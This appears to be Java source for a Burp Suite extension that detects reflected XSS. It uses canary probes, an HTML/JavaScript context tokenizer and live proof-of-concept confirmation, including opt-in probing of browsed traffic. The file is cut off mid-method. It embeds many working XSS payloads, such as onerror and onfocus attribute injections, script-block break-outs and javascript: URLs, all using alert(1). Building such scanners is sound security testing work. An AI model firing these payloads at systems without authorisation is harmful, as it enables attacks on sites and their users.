package burp;

import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Set;

/**
 * ContextualReflectionEngine
 *
 * A fully contextual reflected-XSS engine for modern applications, covering
 * HTML, attribute, JavaScript, CSS and JSON/JSONP reflection contexts.
 *
 * Detection is a two-request, double-confirmed process per insertion point, so
 * a finding is only ever raised on a genuine, live break-out:
 *
 *   STAGE 1 -- Measure. Inject a probe that interleaves a unique alphabetic
 *   canary with every break-out character
 *   (CANARY c0 CANARY c1 CANARY ... CANARY). The canary is pure [a-z] so it
 *   survives every output encoder; splitting the reflected block on the canary
 *   yields, for each special character, the exact transformation applied at the
 *   point of reflection (verbatim, HTML-entity-encoded, backslash-escaped,
 *   URL-encoded or stripped). A forward HTML/JS tokenizer -- which models
 *   rawtext/RCDATA elements (script, style, textarea, title, iframe, xmp, ...),
 *   quoted/unquoted attributes, URL attributes, event handlers and JS
 *   string/template literals -- fixes the exact reflection context.
 *
 *   STAGE 2 -- Confirm. The context-specific proof-of-concept derived from
 *   stage 1 is injected for real and the response is checked for the payload
 *   reflected verbatim and unescaped. Only if this live confirmation succeeds
 *   is an issue raised, which drives the false-positive rate to near zero
 *   (keyword/tag WAFs that pass single characters but block whole payloads are
 *   caught here, as is any encoding the single-character probe could not see).
 *
 * Reported issues contain only dynamic, real-time evidence gathered from these
 * two live requests -- the reflection context, the per-character break-out
 * table, the confirmed PoC and the live reflected snippet. No static
 * remediation or background text is emitted.
 */
public class ContextualReflectionEngine {

    private final IExtensionHelpers helpers;
    private final IBurpExtenderCallbacks callbacks;
    private final Settings settings;
    private final java.security.SecureRandom rng = new java.security.SecureRandom();

    /** (host|path|type|param) spots already actively probed on browsed traffic. */
    private final java.util.Set<String> liveProbed =
            java.util.Collections.newSetFromMap(new java.util.concurrent.ConcurrentHashMap<>());

    /** Break-out characters probed, in a fixed order. */
    private static final char[] SPECIALS = {
        '<', '>', '"', '\'', '`', '(', ')', '{', '}', ';', '/', '\\', '=', ':', ' ', '$'
    };

    /** HTML elements whose content is rawtext/RCDATA: a reflection inside one
     *  can only break out via the matching end tag, never by opening a new tag. */
    private static final Set<String> RAWTEXT_ELEMENTS = new HashSet<>(Arrays.asList(
        "textarea", "title", "iframe", "xmp", "noembed", "noframes", "noscript"
    ));

    enum Ctx {
        HTML_TEXT, HTML_COMMENT, TAG_NAME_OR_ATTR, ATTR_DOUBLE, ATTR_SINGLE, ATTR_UNQUOTED,
        ATTR_URL, EVENT_HANDLER, SCRIPT_DATA, SCRIPT_STRING_SINGLE, SCRIPT_STRING_DOUBLE,
        SCRIPT_TEMPLATE, STYLE, RAWTEXT, PLAINTEXT, JSON_STRING, JSONP, UNKNOWN
    }

    public ContextualReflectionEngine(IExtensionHelpers helpers, IBurpExtenderCallbacks callbacks, Settings settings) {
        this.helpers = helpers;
        this.callbacks = callbacks;
        this.settings = settings;
    }

    /**
     * Run the contextual probe + live confirmation against a single insertion
     * point and return a confirmed reflected-XSS issue, or nothing.
     */
    public List<IScanIssue> scan(IHttpRequestResponse baseRequestResponse, final IScannerInsertionPoint insertionPoint) {
        List<IScanIssue> issues = new ArrayList<>();
        if (baseRequestResponse == null || insertionPoint == null) {
            return issues;
        }
        try {
            IHttpService service = baseRequestResponse.getHttpService();
            Injector injector = value -> insertionPoint.buildRequest(helpers.stringToBytes(value));

            ProbeResult pr = probe(injector, service);
            if (pr == null || pr.best == null) {
                return issues; // not reflected, or reflected but not exploitable
            }

            // STAGE 2 -- live confirmation. No issue without it.
            Confirmation conf = confirm(injector, service, pr.best.poc);
            if (conf == null || !conf.confirmed) {
                if (settings != null && settings.getVerboseLogging()) {
                    callbacks.printOutput("[XSSDetector] Contextual: candidate not confirmed ("
                            + pr.best.contextLabel + ", param '" + insertionPoint.getInsertionPointName() + "')");
                }
                return issues;
            }

            IScanIssue issue = buildDynamicIssue(insertionPoint.getInsertionPointName(),
                    insertionTypeName(insertionPoint.getInsertionPointType()), "Scanner", pr.best, conf);
            if (issue != null) {
                issues.add(issue);
                if (settings != null && settings.getVerboseLogging()) {
                    callbacks.printOutput("[XSSDetector] Contextual: CONFIRMED reflected XSS in param '"
                            + insertionPoint.getInsertionPointName() + "' (" + pr.best.contextLabel + ")");
                }
            }
        } catch (Exception e) {
            if (settings != null && settings.getVerboseLogging()) {
                callbacks.printError("[XSSDetector] Contextual: " + e.getMessage());
            }
        }
        return issues;
    }

    /** How a probe/confirm value is placed into the request (insertion point or raw parameter). */
    private interface Injector {
        byte[] build(String value);
    }

    private static final class ProbeResult {
        IHttpRequestResponse probeRR;
        Finding best;
    }

    /** Stage 1: send the measurement probe and pick the most exploitable reflection site. */
    private ProbeResult probe(Injector injector, IHttpService service) {
        try {
            String tag = randomCanary();
            byte[] probeRequest = injector.build(buildProbe(tag));
            IHttpRequestResponse probeRR = callbacks.makeHttpRequest(service, probeRequest);
            if (probeRR == null || probeRR.getResponse() == null) {
                return null;
            }
            byte[] respBytes = probeRR.getResponse();
            IResponseInfo respInfo = helpers.analyzeResponse(respBytes);
            String body = new String(Arrays.copyOfRange(respBytes, respInfo.getBodyOffset(), respBytes.length),
                    StandardCharsets.UTF_8);
            MimeInfo mime = classifyMime(respInfo);

            List<Integer> sites = reflectionSites(body, tag);
            if (sites.isEmpty()) {
                return null;
            }
            Finding best = null;
            for (int siteStart : sites) {
                Finding f = evaluateSite(body, siteStart, tag, mime);
                if (f != null && (best == null || f.confidence > best.confidence)) {
                    best = f;
                }
                if (best != null && best.confidence >= 100.0) {
                    break;
                }
            }
            ProbeResult pr = new ProbeResult();
            pr.probeRR = probeRR;
            pr.best = best;
            return pr;
        } catch (Exception e) {
            return null;
        }
    }

    /**
     * Real-time active confirmation on browsed/proxied traffic (opt-in). For each
     * reflected request parameter it runs the same probe-and-confirm as the active
     * scanner, so genuine reflected XSS is reported as Confirmed just by browsing.
     * Each (host, path, parameter) is probed at most once per session.
     *
     * Returns the confirmed issues so the caller can report them through the
     * central de-duplication gate (never reports directly, to avoid duplicates).
     */
    public List<IScanIssue> liveConfirm(IHttpRequestResponse rr, String source) {
        List<IScanIssue> found = new ArrayList<>();
        try {
            if (rr == null || rr.getRequest() == null || rr.getResponse() == null) {
                return found;
            }
            IResponseInfo respInfo = helpers.analyzeResponse(rr.getResponse());
            if (respInfo.getStatusCode() >= 400) {
                return found; // don't probe off error-page reflections
            }
            MimeInfo mime = classifyMime(respInfo);
            String ct = mime.contentType;
            boolean textual = ct.isEmpty() || ct.contains("html") || ct.contains("json")
                    || ct.contains("javascript") || ct.contains("xml") || ct.contains("text");
            if (!textual) {
                return found;
            }
            byte[] respBytes = rr.getResponse();
            String body = new String(Arrays.copyOfRange(respBytes, respInfo.getBodyOffset(), respBytes.length),
                    StandardCharsets.UTF_8);

            IRequestInfo reqInfo = helpers.analyzeRequest(rr);
            final byte[] baseRequest = rr.getRequest();
            final IHttpService service = rr.getHttpService();
            String host = service != null ? service.getHost() : "";
            String path = reqInfo.getUrl() != null ? reqInfo.getUrl().getPath() : "";

            int done = 0;
            for (IParameter p : reqInfo.getParameters()) {
                if (done >= 5) {
                    break; // keep browse-time load bounded
                }
                final byte type = p.getType();
                if (type != IParameter.PARAM_URL && type != IParameter.PARAM_BODY && type != IParameter.PARAM_COOKIE) {
                    continue; // other vector types are covered by the active scanner
                }
                String value = p.getValue();
                if (value == null || value.length() < 3 || looksNavigational(value)) {
                    continue;
                }
                String decoded = value;
                try {
                    String d = helpers.urlDecode(value);
                    if (d != null) {
                        decoded = d;
                    }
                } catch (Exception ignored) {
                    // use raw value
                }
                if (body.indexOf(decoded) < 0 && body.indexOf(value) < 0) {
                    continue; // not reflected -> do not probe
                }
                String key = host + "|" + path + "|" + type + "|" + p.getName();
                if (!liveProbed.add(key)) {
                    continue; // already probed this spot in this session
                }
                final String name = p.getName();
                Injector injector = v -> helpers.updateParameter(baseRequest,
                        helpers.buildParameter(name, helpers.urlEncode(v), type));

                ProbeResult pr = probe(injector, service);
                if (pr == null || pr.best == null) {
                    done++;
                    continue;
                }
                Confirmation conf = confirm(injector, service, pr.best.poc);
                if (conf != null && conf.confirmed) {
                    IScanIssue issue = buildDynamicIssue(name, insertionTypeName(type), source, pr.best, conf);
                    if (issue != null) {
                        found.add(issue); // reported by the caller through central de-dup
                        callbacks.printOutput("[XSSDetector] Live-confirmed reflected XSS: param '" + name
                                + "' (" + pr.best.contextLabel + ") at " + host + path);
                    }
                }
                done++;
            }
        } catch (Exception e) {
            if (settings != null && settings.getVerboseLogging()) {
                callbacks.printError("[XSSDetector] liveConfirm: " + e.getMessage());
            }
        }
        return found;
    }

    /**
     * Real-time passive feed: while traffic is proxied/browsed, detect where a
     * request parameter is reflected in the response and record it (with its
     * context) in the Live Results view. No payload is injected here -- these
     * are candidates to be actively confirmed, so they are recorded as
     * {@link XssFinding#STATUS_REFLECTED} at Info severity and are upgraded to
     * Confirmed automatically if an active scan verifies them.
     */
    public void passiveReflections(IHttpRequestResponse rr, String source) {
        try {
            if (rr == null || rr.getResponse() == null || rr.getRequest() == null) {
                return;
            }
            IResponseInfo respInfo = helpers.analyzeResponse(rr.getResponse());
            // Ignore error pages: a value echoed in a 4xx/5xx is not a usable
            // reflection and only adds noise to the Live Results view.
            short status = respInfo.getStatusCode();
            if (status >= 400) {
                return;
            }
            MimeInfo mime = classifyMime(respInfo);
            String ct = mime.contentType;
            boolean textual = ct.isEmpty() || ct.contains("html") || ct.contains("json")
                    || ct.contains("javascript") || ct.contains("xml") || ct.contains("text");
            if (!textual) {
                return;
            }
            byte[] respBytes = rr.getResponse();
            String body = new String(Arrays.copyOfRange(respBytes, respInfo.getBodyOffset(), respBytes.length),
                    StandardCharsets.UTF_8);

            IRequestInfo reqInfo = helpers.analyzeRequest(rr);
            String method = reqInfo.getMethod();
            String url = reqInfo.getUrl() != null ? reqInfo.getUrl().toString() : "";
            IHttpService svc = rr.getHttpService();
            String host = svc != null ? svc.getHost() : "";

            int reported = 0;
            for (IParameter p : reqInfo.getParameters()) {
                if (reported >= 10) {
                    break; // keep the browse feed light
                }
                String value = p.getValue();
                if (value == null || value.length() < 4) {
                    continue;
                }
                if (looksNavigational(value)) {
                    continue; // filenames/paths/URLs echoed back are not XSS candidates
                }
                String decoded = value;
                try {
                    String d = helpers.urlDecode(value);
                    if (d != null) {
                        decoded = d;
                    }
                } catch (Exception ignored) {
                    // use raw value
                }
                int idx = body.indexOf(decoded);
                if (idx < 0 && !decoded.equals(value)) {
                    idx = body.indexOf(value);
                }
                if (idx < 0) {
                    continue;
                }
                CtxResult c = detectContext(body, idx);
                if (c.ctx == Ctx.UNKNOWN || c.ctx == Ctx.PLAINTEXT) {
                    continue; // nothing actionable to flag
                }
                XssFinding xf = new XssFinding(
                        "Info", XssFinding.STATUS_REFLECTED, contextLabel(c), p.getName(),
                        method, host, url, source,
                        "Reflection seen while browsing - run an active scan to confirm.",
                        rr.getRequest(), rr.getResponse());
                xf.reqHighlight = value;    // the parameter value in the request
                xf.respHighlight = decoded; // where it is reflected in the response
                if (svc != null) {
                    xf.port = svc.getPort();
                    xf.https = "https".equalsIgnoreCase(svc.getProtocol());
                }
                FindingStore.get().add(xf);
                reported++;
            }
        } catch (Exception e) {
            if (settings != null && settings.getVerboseLogging()) {
                callbacks.printError("[ContextualReflectionEngine] passive: " + e.getMessage());
            }
        }
    }

    private String contextLabel(CtxResult c) {
        switch (c.ctx) {
            case HTML_TEXT: return "HTML text";
            case HTML_COMMENT: return "HTML comment";
            case TAG_NAME_OR_ATTR: return "Tag / attribute-name position";
            case ATTR_DOUBLE: return "Double-quoted attribute";
            case ATTR_SINGLE: return "Single-quoted attribute";
            case ATTR_UNQUOTED: return "Unquoted attribute";
            case ATTR_URL: return "URL attribute";
            case EVENT_HANDLER: return "Event handler (JavaScript)";
            case SCRIPT_DATA: return "Inline <script> block";
            case SCRIPT_STRING_SINGLE: return "JavaScript string (single-quoted)";
            case SCRIPT_STRING_DOUBLE: return "JavaScript string (double-quoted)";
            case SCRIPT_TEMPLATE: return "JavaScript template literal";
            case STYLE: return "Inline <style> block";
            case RAWTEXT: return "Rawtext element <" + (c.rawTag.isEmpty() ? "textarea" : c.rawTag) + ">";
            case JSON_STRING: return "JSON value";
            case JSONP: return "JSONP callback";
            default: return "Reflection";
        }
    }

    /** True for values that are clearly navigation tokens (paths, filenames,
     *  URLs) rather than user input worth flagging as an XSS candidate. */
    private static boolean looksNavigational(String v) {
        if (v == null) {
            return false;
        }
        String s = v.trim().toLowerCase(Locale.ROOT);
        if (s.isEmpty()) {
            return false;
        }
        if (s.contains("://")) {
            return true;
        }
        if (!s.matches("[a-z0-9_./:%-]+")) {
            return false; // contains spaces/special chars -> likely real input, keep it
        }
        return s.contains("/")
                || s.matches(".*\\.(html?|jspx?|php|aspx?|do|action|css|js|png|jpe?g|gif|svg|ico|json|xml|pdf|woff2?)$");
    }

    // ------------------------------------------------------------------
    // Probe construction / decoding
    // ------------------------------------------------------------------

    private String randomCanary() {
        StringBuilder sb = new StringBuilder("zq");
        String alphabet = "abcdefghijklmnopqrstuvwxyz";
        for (int i = 0; i < 7; i++) {
            sb.append(alphabet.charAt(rng.nextInt(alphabet.length())));
        }
        return sb.toString();
    }

    /** CANARY c0 CANARY c1 CANARY ... c(n-1) CANARY */
    private String buildProbe(String tag) {
        StringBuilder sb = new StringBuilder(tag);
        for (char c : SPECIALS) {
            sb.append(c).append(tag);
        }
        return sb.toString();
    }

    private Map<Character, CharFate> decodeSurvival(String body, int siteStart, String tag) {
        Map<Character, CharFate> fate = new HashMap<>();
        int blockEnd = Math.min(body.length(), siteStart + tag.length() * (SPECIALS.length + 2) + 64 * SPECIALS.length);
        String block = body.substring(siteStart, blockEnd);
        String[] parts = block.split(java.util.regex.Pattern.quote(tag), -1);
        for (int i = 0; i < SPECIALS.length; i++) {
            char c = SPECIALS[i];
            String t = (i + 1 < parts.length) ? parts[i + 1] : "";
            fate.put(c, classifyFate(c, t));
        }
        return fate;
    }

    private CharFate classifyFate(char c, String transform) {
        CharFate f = new CharFate();
        if (transform == null || transform.isEmpty()) {
            f.stripped = true;
            return f;
        }
        int idx = transform.indexOf(c);
        if (idx >= 0) {
            f.present = true;
            f.unescaped = (idx == 0) || transform.charAt(idx - 1) != '\\';
            if (idx > 0 && transform.charAt(idx - 1) == '\\') {
                f.backslashEscaped = true;
            }
        }
        String low = transform.toLowerCase(Locale.ROOT);
        if (low.contains("&lt;") || low.contains("&gt;") || low.contains("&quot;")
                || low.contains("&#39;") || low.contains("&#x27;") || low.contains("&apos;")
                || low.contains("&#x3c;") || low.contains("&#60;") || low.contains("&amp;")) {
            f.htmlEncoded = true;
        }
        if (low.contains("%3c") || low.contains("%3e") || low.contains("%22") || low.contains("%27")) {
            f.urlEncoded = true;
        }
        return f;
    }

    // ------------------------------------------------------------------
    // Context detection (forward HTML/JS tokenizer)
    // ------------------------------------------------------------------

    private static final class CtxResult {
        Ctx ctx = Ctx.UNKNOWN;
        String attrName = "";
        String rawTag = "";       // the rawtext/RCDATA element name, when applicable
        boolean valueAtStart;
    }

    private CtxResult detectContext(String body, int pos) {
        CtxResult r = new CtxResult();
        final int DATA = 0, TAG = 1, COMMENT = 2, RAW_SCRIPT = 3, RAW_STYLE = 4, RAW_TEXT = 5, PLAIN = 6;
        int mode = DATA;

        String tagName = "";
        String attrName = "";
        String rawTag = "";
        boolean inAttrValue = false;
        char attrQuote = 0;
        int valueStartPos = -1;
        char jsQuote = 0;
        boolean jsLineComment = false, jsBlockComment = false;

        int i = 0;
        int n = body.length();
        while (i < pos && i < n) {
            char c = body.charAt(i);
            switch (mode) {
                case DATA: {
                    if (c == '<') {
                        if (body.startsWith("<!--", i)) {
                            mode = COMMENT;
                            i += 4;
                            continue;
                        }
                        int j = i + 1;
                        if (j < n && body.charAt(j) == '/') {
                            j++;
                        }
                        if (j < n && isNameStart(body.charAt(j))) {
                            int s = j;
                            while (j < n && isNameChar(body.charAt(j))) {
                                j++;
                            }
                            tagName = body.substring(s, j).toLowerCase(Locale.ROOT);
                            attrName = "";
                            inAttrValue = false;
                            attrQuote = 0;
                            mode = TAG;
                            i = j;
                            continue;
                        }
                    }
                    i++;
                    break;
                }
                case COMMENT: {
                    if (body.startsWith("-->", i)) {
                        mode = DATA;
                        i += 3;
                        continue;
                    }
                    i++;
                    break;
                }
                case TAG: {
                    if (attrQuote != 0) {
                        if (c == attrQuote) {
                            attrQuote = 0;
                            inAttrValue = false;
                            attrName = "";
                        }
                        i++;
                        break;
                    }
                    if (inAttrValue) {
                        if (c == '>' || isWhite(c)) {
                            inAttrValue = false;
                            attrName = "";
                            if (c == '>') {
                                int[] res = enterBody(tagName);
                                mode = res[0];
                                rawTag = (res[0] == RAW_TEXT) ? tagName : "";
                                tagName = "";
                            }
                            i++;
                        } else {
                            i++;
                        }
                        break;
                    }
                    if (c == '>') {
                        int[] res = enterBody(tagName);
                        mode = res[0];
                        rawTag = (res[0] == RAW_TEXT) ? tagName : "";
                        tagName = "";
                        i++;
                        break;
                    }
                    if (c == '"' || c == '\'') {
                        attrQuote = c;
                        valueStartPos = i + 1;
                        i++;
                        break;
                    }
                    if (c == '=') {
                        i++;
                        while (i < pos && i < n && isWhite(body.charAt(i))) {
                            i++;
                        }
                        if (i < n && (body.charAt(i) == '"' || body.charAt(i) == '\'')) {
                            attrQuote = body.charAt(i);
                            valueStartPos = i + 1;
                            i++;
                        } else {
                            inAttrValue = true;
                            valueStartPos = i;
                        }
                        break;
                    }
                    if (isWhite(c)) {
                        i++;
                        break;
                    }
                    int s = i;
                    while (i < pos && i < n && !isWhite(body.charAt(i)) && body.charAt(i) != '='
                            && body.charAt(i) != '>' && body.charAt(i) != '"' && body.charAt(i) != '\'') {
                        i++;
                    }
                    attrName = body.substring(s, Math.min(i, n)).toLowerCase(Locale.ROOT);
                    break;
                }
                case RAW_SCRIPT: {
                    if ((c == '<') && regionIgnoreCase(body, i, "</script")) {
                        mode = DATA;
                        jsQuote = 0;
                        jsLineComment = false;
                        jsBlockComment = false;
                        i += 2;
                        continue;
                    }
                    if (jsLineComment) {
                        if (c == '\n') {
                            jsLineComment = false;
                        }
                        i++;
                        break;
                    }
                    if (jsBlockComment) {
                        if (c == '*' && i + 1 < n && body.charAt(i + 1) == '/') {
                            jsBlockComment = false;
                            i += 2;
                            continue;
                        }
                        i++;
                        break;
                    }
                    if (jsQuote != 0) {
                        if (c == '\\') {
                            i += 2;
                            continue;
                        }
                        if (c == jsQuote) {
                            jsQuote = 0;
                        }
                        i++;
                        break;
                    }
                    if (c == '/' && i + 1 < n && body.charAt(i + 1) == '/') {
                        jsLineComment = true;
                        i += 2;
                        continue;
                    }
                    if (c == '/' && i + 1 < n && body.charAt(i + 1) == '*') {
                        jsBlockComment = true;
                        i += 2;
                        continue;
                    }
                    if (c == '"' || c == '\'' || c == '`') {
                        jsQuote = c;
                        i++;
                        break;
                    }
                    i++;
                    break;
                }
                case RAW_STYLE: {
                    if ((c == '<') && regionIgnoreCase(body, i, "</style")) {
                        mode = DATA;
                        i += 2;
                        continue;
                    }
                    i++;
                    break;
                }
                case RAW_TEXT: {
                    if ((c == '<') && regionIgnoreCase(body, i, "</" + rawTag)) {
                        mode = DATA;
                        rawTag = "";
                        i += 2;
                        continue;
                    }
                    i++;
                    break;
                }
                case PLAIN:
                default:
                    i++;
            }
        }

        switch (mode) {
            case COMMENT:
                r.ctx = Ctx.HTML_COMMENT;
                return r;
            case RAW_STYLE:
                r.ctx = Ctx.STYLE;
                return r;
            case RAW_TEXT:
                r.ctx = Ctx.RAWTEXT;
                r.rawTag = rawTag;
                return r;
            case PLAIN:
                r.ctx = Ctx.PLAINTEXT;
                return r;
            case RAW_SCRIPT:
                if (jsQuote == '`') {
                    r.ctx = Ctx.SCRIPT_TEMPLATE;
                } else if (jsQuote == '\'') {
                    r.ctx = Ctx.SCRIPT_STRING_SINGLE;
                } else if (jsQuote == '"') {
                    r.ctx = Ctx.SCRIPT_STRING_DOUBLE;
                } else {
                    r.ctx = Ctx.SCRIPT_DATA;
                }
                return r;
            case TAG:
                r.attrName = attrName;
                r.valueAtStart = (valueStartPos == pos);
                if (attrQuote == '"' || attrQuote == '\'') {
                    if (isEventHandler(attrName)) {
                        r.ctx = Ctx.EVENT_HANDLER;
                    } else if (isUrlAttr(attrName)) {
                        r.ctx = Ctx.ATTR_URL;
                    } else {
                        r.ctx = (attrQuote == '"') ? Ctx.ATTR_DOUBLE : Ctx.ATTR_SINGLE;
                    }
                } else if (inAttrValue) {
                    if (isEventHandler(attrName)) {
                        r.ctx = Ctx.EVENT_HANDLER;
                    } else if (isUrlAttr(attrName)) {
                        r.ctx = Ctx.ATTR_URL;
                    } else {
                        r.ctx = Ctx.ATTR_UNQUOTED;
                    }
                } else {
                    r.ctx = Ctx.TAG_NAME_OR_ATTR;
                }
                return r;
            default:
                r.ctx = Ctx.HTML_TEXT;
                return r;
        }
    }

    /** Returns the body-mode to enter after a tag's ">" ( {mode} ). */
    private int[] enterBody(String tagName) {
        if ("script".equals(tagName)) {
            return new int[]{3};
        }
        if ("style".equals(tagName)) {
            return new int[]{4};
        }
        if ("plaintext".equals(tagName)) {
            return new int[]{6};
        }
        if (RAWTEXT_ELEMENTS.contains(tagName)) {
            return new int[]{5};
        }
        return new int[]{0};
    }

    // ------------------------------------------------------------------
    // Exploitability evaluation (confirmed-only; zero tolerance for guesses)
    // ------------------------------------------------------------------

    private Finding evaluateSite(String body, int siteStart, String tag, MimeInfo mime) {
        Map<Character, CharFate> fate = decodeSurvival(body, siteStart, tag);

        if (mime.isJson || mime.isJavaScript) {
            Finding jf = evaluateJson(body, siteStart, tag, fate, mime);
            if (jf != null) {
                jf.fate = fate;
                return jf;
            }
            if (!mime.htmlRenderable) {
                return null; // structured data not reachable as markup
            }
        }

        CtxResult c = detectContext(body, siteStart);
        Finding f = evaluateHtml(c, fate);
        if (f != null) {
            f.fate = fate;
        }
        return f;
    }

    private Finding evaluateHtml(CtxResult c, Map<Character, CharFate> fate) {
        boolean lt = present(fate, '<');
        boolean gt = present(fate, '>');
        boolean sp = present(fate, ' ');
        boolean slash = present(fate, '/');

        switch (c.ctx) {
            case HTML_TEXT: {
                if (lt && gt) {
                    return hi(c.ctx, "HTML text", 100.0, "<img src=x onerror=alert(1)>",
                            "< and > are reflected unencoded in HTML text, allowing arbitrary tag injection.");
                }
                if (lt) {
                    return hi(c.ctx, "HTML text", 92.0, "<svg onload=alert(1)>",
                            "< is reflected unencoded in HTML text; a tag can be injected (the browser auto-completes the markup).");
                }
                return null;
            }
            case HTML_COMMENT: {
                if (gt && lt) {
                    return med(c.ctx, "HTML comment", 88.0, "--><img src=x onerror=alert(1)>",
                            "The comment can be closed with --> (< and > survive) and a new tag injected.");
                }
                return null;
            }
            case TAG_NAME_OR_ATTR: {
                if (sp) {
                    return hi(c.ctx, "Tag / attribute-name position", 99.0, " autofocus onfocus=alert(1) ",
                            "The reflection sits where a new attribute can be added; an event-handler attribute injects JavaScript.");
                }
                if (gt && lt) {
                    return hi(c.ctx, "Tag / attribute-name position", 96.0, "><img src=x onerror=alert(1)>",
                            "The tag can be closed with > and a new element injected.");
                }
                return null;
            }
            case ATTR_DOUBLE: {
                boolean q = unescaped(fate, '"');
                if (q && lt && gt) {
                    return hi(c.ctx, "Double-quoted attribute", 100.0, "\"><img src=x onerror=alert(1)>",
                            "The double quote is reflected unencoded, breaking out of the attribute, and < > allow tag injection.");
                }
                if (q && sp) {
                    return hi(c.ctx, "Double-quoted attribute", 97.0, "\" autofocus onfocus=alert(1) x=\"",
                            "The double quote breaks out of the attribute value and a new event-handler attribute can be added.");
                }
                return null;
            }
            case ATTR_SINGLE: {
                boolean q = unescaped(fate, '\'');
                if (q && lt && gt) {
                    return hi(c.ctx, "Single-quoted attribute", 100.0, "'><img src=x onerror=alert(1)>",
                            "The single quote is reflected unencoded, breaking out of the attribute, and < > allow tag injection.");
                }
                if (q && sp) {
                    return hi(c.ctx, "Single-quoted attribute", 97.0, "' autofocus onfocus=alert(1) x='",
                            "The single quote breaks out of the attribute value and a new event-handler attribute can be added.");
                }
                return null;
            }
            case ATTR_UNQUOTED: {
                if (sp) {
                    return hi(c.ctx, "Unquoted attribute", 98.0, " onmouseover=alert(1) ",
                            "The value is unquoted and whitespace survives, so an event-handler attribute can be appended directly.");
                }
                if (gt && lt) {
                    return hi(c.ctx, "Unquoted attribute", 96.0, "><img src=x onerror=alert(1)>",
                            "The unquoted value can be terminated with > and a new element injected.");
                }
                return null;
            }
            case ATTR_URL: {
                boolean colon = present(fate, ':');
                if (c.valueAtStart && colon) {
                    return hi(c.ctx, "URL attribute (scheme)", 94.0, "javascript:alert(1)",
                            "The value controls the start of a URL-bearing attribute; the javascript: scheme executes on activation.");
                }
                boolean q = unescaped(fate, '"') || unescaped(fate, '\'');
                if (q && lt && gt) {
                    return hi(c.ctx, "URL attribute", 92.0, "\"><img src=x onerror=alert(1)>",
                            "The quote delimiting the URL attribute is reflected unencoded, allowing break-out and tag injection.");
                }
                return null;
            }
            case EVENT_HANDLER: {
                boolean q = unescaped(fate, '"') || unescaped(fate, '\'');
                if (q) {
                    return hi(c.ctx, "Event handler (JavaScript)", 99.0, "';alert(1);//",
                            "The reflection is inside an on* event-handler value and the surrounding quote is reflected unencoded, so JavaScript can be injected.");
                }
                return hi(c.ctx, "Event handler (JavaScript)", 93.0, "-alert(1)-",
                        "The reflection is inside an on* event-handler value (a JavaScript execution context).");
            }
            case SCRIPT_DATA: {
                if (lt && slash) {
                    return hi(c.ctx, "Inline <script> block", 100.0, "</script><img src=x onerror=alert(1)>",
                            "The reflection is in an inline script block; </script> closes it and a new element is injected.");
                }
                return hi(c.ctx, "Inline <script> block", 98.0, ";alert(1);//",
                        "The reflection is directly inside an inline <script> block (a JavaScript execution context).");
            }
            case SCRIPT_STRING_DOUBLE: {
                if (unescaped(fate, '"')) {
                    return hi(c.ctx, "JavaScript string (double-quoted)", 99.0, "\";alert(1);//",
                            "The double quote is reflected unescaped inside a JavaScript string literal, allowing the string to be broken and code injected.");
                }
                if (lt && slash) {
                    return hi(c.ctx, "JavaScript string (double-quoted)", 92.0, "</script><img src=x onerror=alert(1)>",
                            "The string cannot be broken directly, but </script> terminates the script element (< and / survive), allowing tag injection.");
                }
                return null;
            }
            case SCRIPT_STRING_SINGLE: {
                if (unescaped(fate, '\'')) {
                    return hi(c.ctx, "JavaScript string (single-quoted)", 99.0, "';alert(1);//",
                            "The single quote is reflected unescaped inside a JavaScript string literal, allowing the string to be broken and code injected.");
                }
                if (lt && slash) {
                    return hi(c.ctx, "JavaScript string (single-quoted)", 92.0, "</script><img src=x onerror=alert(1)>",
                            "The string cannot be broken directly, but </script> terminates the script element (< and / survive), allowing tag injection.");
                }
                return null;
            }
            case SCRIPT_TEMPLATE: {
                boolean dollar = present(fate, '$');
                boolean ob = present(fate, '{');
                boolean cb = present(fate, '}');
                if (dollar && ob && cb) {
                    return hi(c.ctx, "JavaScript template literal", 99.0, "${alert(1)}",
                            "Inside a template literal, ${...} is evaluated as JavaScript and the required characters survive.");
                }
                if (unescaped(fate, '`')) {
                    return hi(c.ctx, "JavaScript template literal", 96.0, "`;alert(1);//",
                            "The backtick is reflected unescaped, breaking out of the template literal.");
                }
                return null;
            }
            case STYLE: {
                if (lt && slash) {
                    return med(c.ctx, "Inline <style> block", 85.0, "</style><img src=x onerror=alert(1)>",
                            "The reflection is inside a style block; </style> closes it (< and / survive), allowing tag injection.");
                }
                return null;
            }
            case RAWTEXT: {
                // textarea/title/iframe/xmp/... : only the matching end tag breaks out.
                if (lt && slash && gt) {
                    String close = "</" + (c.rawTag.isEmpty() ? "textarea" : c.rawTag) + ">";
                    return hi(c.ctx, "Rawtext element <" + (c.rawTag.isEmpty() ? "textarea" : c.rawTag) + ">", 90.0,
                            close + "<img src=x onerror=alert(1)>",
                            "The reflection is inside a rawtext/RCDATA element; the matching end tag " + close
                            + " closes it (< / > survive), allowing tag injection.");
                }
                return null; // cannot break out -> not a false positive
            }
            case PLAINTEXT:
            default:
                return null; // <plaintext> cannot be escaped; never report
        }
    }

    private Finding evaluateJson(String body, int siteStart, String tag,
                                 Map<Character, CharFate> fate, MimeInfo mime) {
        int blockEnd = Math.min(body.length(), siteStart + tag.length() * (SPECIALS.length + 2) + 64 * SPECIALS.length);
        String block = body.substring(siteStart, blockEnd);
        String[] parts = block.split(java.util.regex.Pattern.quote(tag), -1);
        String after = parts.length > 0 ? parts[parts.length - 1] : "";
        boolean nearStart = siteStart <= firstNonWhitespace(body) + 2;

        if ((mime.isJavaScript || mime.isJson) && nearStart && after.trim().startsWith("(")) {
            Finding f = hi(Ctx.JSONP, "JSONP callback", 96.0, "alert(1)",
                    "The response is JSONP: the reflected parameter is used as the callback function name and executed directly as JavaScript.");
            f.isJson = true;
            return f;
        }

        boolean lt = present(fate, '<');
        boolean gt = present(fate, '>');
        if (mime.htmlRenderable && lt && gt) {
            Finding f = hi(Ctx.JSON_STRING, "JSON rendered as HTML", 92.0, "<img src=x onerror=alert(1)>",
                    "The JSON body is served with a Content-Type a browser treats as HTML (" + mime.describe()
                    + ") and < > are reflected unencoded, so injected markup executes.");
            f.isJson = true;
            return f;
        }
        return null;
    }

    // ------------------------------------------------------------------
    // Stage 2: live confirmation of the proof-of-concept
    // ------------------------------------------------------------------

    private Confirmation confirm(Injector injector, IHttpService service, String poc) {
        try {
            String lm = randomCanary();
            String rm = randomCanary();
            String value = lm + poc + rm;
            byte[] request = injector.build(value);
